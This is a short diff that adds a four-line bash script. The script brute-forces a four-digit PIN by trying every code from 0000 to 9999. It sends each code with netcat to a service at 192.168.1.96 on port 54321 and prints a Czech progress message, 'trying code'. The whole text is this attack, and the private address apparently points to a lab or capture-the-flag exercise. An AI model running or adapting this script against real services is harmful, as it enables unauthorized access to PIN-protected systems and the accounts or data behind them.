@@ -1,0 +1,4 @@
+for i in {0000..9999}; do
+  echo -ne "\rZkouším kód: $i"
+  echo $i | nc -w 0.01 192.168.1.96 54321
+done
